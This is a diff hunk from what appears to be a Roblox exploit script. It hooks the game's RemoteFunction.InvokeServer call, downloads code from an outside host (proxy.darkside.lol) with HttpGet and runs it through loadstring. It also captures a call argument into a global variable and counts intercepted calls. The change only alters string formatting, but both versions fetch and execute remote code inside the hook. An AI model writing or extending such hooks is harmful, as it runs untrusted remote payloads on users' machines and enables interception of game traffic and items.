@@ -82,7 +82,7 @@ _G.pvc = ""
 local remoteFunction = Instance.new("RemoteFunction")
 local originalFunction
 originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("called script"..x)
+loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()("called script "..tostring(x))
 local args = {...}
 _G.pvc = args[4]
 mailc=mailc+1
